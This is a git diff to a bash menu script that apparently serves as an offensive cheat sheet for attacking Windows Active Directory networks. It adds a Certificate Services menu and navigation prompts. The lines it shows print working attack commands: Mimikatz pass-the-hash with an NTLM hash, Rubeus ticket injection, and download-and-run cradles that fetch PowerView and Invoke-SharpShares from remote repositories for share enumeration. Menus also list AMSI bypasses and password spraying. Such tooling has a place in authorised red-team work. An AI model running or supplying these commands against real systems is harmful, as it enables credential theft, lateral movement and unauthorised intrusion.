@@ -79,12 +79,13 @@ echo -ne " What would you like to do?
 
 
 	1)  ->  [ Alternate Authentication	]
-	2)  ->  [ Credential Access		]
-	3)  ->  [ MiTM Attacks 			]
-	4)  ->  [ MSSQL 			]
-        5)  ->  [ Password Spraying 		]
-        6)  ->  [ Privilege Escalation		]
-        7)  ->  [ Recon 			]
+	2   ->	[ Certificate Services 		]
+	3)  ->  [ Credential Access		]
+	4)  ->  [ MiTM Attacks 			]
+	5)  ->  [ MSSQL 			]
+        6)  ->  [ Password Spraying 		]
+        7)  ->  [ Privilege Escalation		]
+        8)  ->  [ Recon 			]
         
         A)  ->	[ AMSI Bypasses			]
         
@@ -92,12 +93,13 @@ echo -ne " What would you like to do?
         read a
         case $a in
                 1) 	Internal_Menu_Alternate_Authentication ;;
-                2) 	Internal_Menu_Credential_Access ;;
-        	3) 	Internal_Menu_MiTM_Attacks ;;
-        	4) 	Internal_Menu_MSSQL ;;
-	        5) 	Internal_Menu_Password_Spraying ;;
-	        6) 	Internal_Menu_Privilege_Escalation ;;
-	        7) 	Internal_Menu_Recon ;;
+                2)	Internal_Menu_Certificate_Services ;;
+                3) 	Internal_Menu_Credential_Access ;;
+        	4) 	Internal_Menu_MiTM_Attacks ;;
+        	5) 	Internal_Menu_MSSQL ;;
+	        6) 	Internal_Menu_Password_Spraying ;;
+	        7) 	Internal_Menu_Privilege_Escalation ;;
+	        8) 	Internal_Menu_Recon ;;
 	        a|A)	Internal_Menu_AMSI_Bypasses ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
@@ -150,6 +152,20 @@ echo -e "${YELLOW}Spawn PowerShell Process with supplied user's NTLM hash${RESTO
 echo -e "Invoke-Mimikatz -Command '"\"sekurlsa::pth /user:[User] /domain:[Domain] /ntlm:[NTLM] /run:powershell.exe"\"'"
 echo -e ""
 echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+       
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Alternate_Authentication ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
 }
 
 
@@ -193,6 +209,32 @@ echo -e "${YELLOW}Inject ticket (base64 blob)${RESTORE}"
 echo -e "Invoke-Rubeus -Command "\"ptt /ticket:[Base64Blob]"\""
 echo -e ""
 echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+       
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Alternate_Authentication ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
+}
+
+Internal_Menu_Certificate_Services(){
+
+	clear
+
+echo -e ""
+echo -e ""
+echo -e ""      
+echo -e "${LGREEN}Certificate Services${RESTORE}"
+echo -e ""
+
 }
 
 
@@ -1184,6 +1226,7 @@ echo -e "${LGREEN}File and Share Enumeration${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Share Enumeration${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-ShareFinder -verbose"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpShares.ps1);Invoke-SharpShares -Command "\"--shares"\""
 echo -e ""
 echo -e "${IBLUE}File Enumeration${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-FileFinder -verbose"
